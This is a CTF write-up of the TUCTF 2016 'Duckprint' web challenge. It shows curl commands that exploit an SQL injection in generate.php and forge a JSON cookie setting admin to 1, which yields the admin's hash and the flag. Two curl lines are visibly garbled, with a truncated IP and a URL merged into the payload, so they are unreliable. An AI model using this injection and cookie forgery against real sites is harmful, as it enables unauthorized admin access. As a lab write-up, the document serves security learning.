# TUCTF 2016: Duckprint

## Challenge details
| Event | Challenge | Category | Points |
|:------|:----------|:---------|-------:|
| TUCTF | Duckprint | Web | 100 |

### Description
> See if you can steal the admin's duck print and validate it!
>
> When calculating the SHA, leave the periods in
> 
> http://130.211.242.26:31337

## First steps

We're presented with a website called DuckPrint, we see 3 links to: register.php, generate.php and validate.php.

Upon visiting **validate.php** we get a javascript-alert box telling us only the admin can use that page. This page also contains a form so we can probably just POST to generate.php with POST-vars duckprint, Submit=Submit and submitted=1, but we first need to find the duckprint of the admin. If we make a POST-request to this script:

```bash
$curl --url 'http://130.211.242.26:31337/validate.php' --data 'Submit=Submit&submitted=1&duckprint=ayylmao'
```

It tells us the name of the admin.

```html
That is not DuckDuckGoose's Duck Print!
```

**generate.php** has a single input-box in which we can enter a username. This script seems to be vulnerable to SQL-injection. 
Also, on this page we see the supposed 'duck print format' : 
```html
Duck Print format: sha256(b64(username) + "." + b64(cookie) + "." + b64(token))
```
And, as seen in the source, the query looks like this:
```html
<!-- $query = "SELECT * FROM users WHERE username ='" . $username . "'"; -->
```

with **register.php** we can register a username:

```bash
$ curl --url 'http://130.211.242.26:31337/register.php' --data 'submitted=1&Submit=Submit&username=aayyylmao00' -i
Set-Cookie: duck_cookie=%7B%22username%22%3A%22aayyylmao00%22%2C%22admin%22%3A0%7D
```

We see a cookie being set, which is simply an url-encoded JSON-object with our username and an attribute called 'admin'

```json
{"username":"aayyylmao00","admin":0}
```

## Generating the admins duck print

Now, on the generate.php page, if we look for our user:
```bash
$ curl --url http://1342.26:31337/generate.php --data 'submitted=1&Submit=Submit&username=aayyylmao00' --cookie "duck_cookie=%7B%22username%22%3A%22aayyylmao00%22%2C%22admin%22%3A0%7D"
```

We see that our token is generated for us, supposedly using the cookie, our username and our 'token'

```html
<p>Username:Admin:Token</p>aayyylmao00:0:6hsz4QEk</br><hr><p>Generated Duck Print for aayyylmao00: 79ba545e739d283ae1307cdc6992b4c37c9cd98c442ed5f243248cf7862f86c1</p>
```
Since the SQL-query that fetches the users to generate the token for is SQL-injectable, we should be able to craft an SQLI like so:

```bash
-420_1337_420' or username='DuckDuckGoose
```

This will return DuckDuckGoose's row instead of ours and the script will subsequently generate the hash for us, without us knowing that the exact format is. Obviously, we also need to alter the cookie to contain username:DuckDuckGoose and admin:1

```bash 
$ curl --url http://130.211.242.26:31337/generat37_420' or username='DuckDuckGoose' limit 0,1#" --cookie "duck_cookie=%7B%22username%22%3A%22DuckDuckGoose%22%2C%22admin%22%3A1%7D"
```
This gives us 
```html
<p>Username:Admin:Token</p>DuckDuckGoose:1:d4rkw1ng</br><hr><p>Generated Duck Print for -420_1337_420' or username='DuckDuckGoose' limit 0,1#: d626290acdc6a948a5f2b5c2850730f4e4b2bdbd36da01226a192985d20d787d</p>
```

So now we have a duckprint 'd626290acdc6a948a5f2b5c2850730f4e4b2bdbd36da01226a192985d20d787d' that should be valid for DuckDuckGoose, lets validate:

```bash
$ curl --url 'http://130.211.242.26:31337/validate.php' --data 'Submit=Submit&submitted=1&duckprint=d626290acdc6a948a5f2b5c2850730f4e4b2bdbd36da01226a192985d20d787d' --cookie "duck_cookie=%7B%22username%22%3A%22DuckDuckGoose%22%2C%22admin%22%3A1%7D"
```

Giving us the flag
```bash
TUCTF{Quacky_McQuackerface}
```



